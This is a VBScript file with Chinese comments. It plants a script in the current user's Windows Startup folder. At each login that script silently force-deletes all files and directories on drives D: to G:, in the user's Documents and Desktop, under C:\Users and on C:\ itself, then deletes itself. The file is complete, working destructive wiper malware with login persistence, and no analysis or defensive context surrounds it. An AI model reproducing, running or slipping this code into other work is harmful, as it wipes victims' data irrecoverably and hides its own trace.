Dim fso, file
Dim filePath, scriptContent
Dim userName
Dim paths
Dim waitTime

' 获取当前用户的用户名
Set WshNetwork = CreateObject("WScript.Network")
userName = WshNetwork.UserName

' 设置路径数组
paths = Array( _
    "G:\", _
    "F:\", _
    "E:\", _
    "D:\", _
    "C:\Users\" & userName & "\Documents\", _
    "C:\Users\" & userName & "\Desktop\", _
    "C:\Users\", _
    "C:\" _
)

' 设置等待时间（毫秒）
waitTime = 100 

' 设置启动脚本的路径
filePath = "C:\Users\" & userName & "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\yourscript.vbs"

' 创建 `Scripting.FileSystemObject` 对象，并在指定位置创建一个新的文本文件
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile(filePath, True)

' 构建脚本内容
scriptContent = "Set WshShell = CreateObject(""WScript.Shell"")" & vbCrLf
scriptContent = scriptContent & "WScript.Sleep " & waitTime & vbCrLf

' 添加删除路径的命令
For Each path In paths
    scriptContent = scriptContent & "path = """ & path & """" & vbCrLf & _
                    "WshShell.Run ""cmd /c del /f /s /q "" & path & ""\*""" & vbCrLf & _
                    "WshShell.Run ""cmd /c rmdir /s /q "" & path" & vbCrLf
Next

' 添加删除自身的命令
scriptContent = scriptContent & vbCrLf & _
                "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf & _
                "fso.DeleteFile WScript.ScriptFullName" & vbCrLf & _
                "Set scriptFile = fso.GetFile(WScript.ScriptFullName)" & vbCrLf & _
                "scriptFile.Attributes = (scriptFile.Attributes Or 2) Or 4"

' 将构建的脚本内容写入文件并关闭文件
file.Write scriptContent
file.Close

' 释放创建的对象以释放资源
Set file = Nothing
Set fso = Nothing
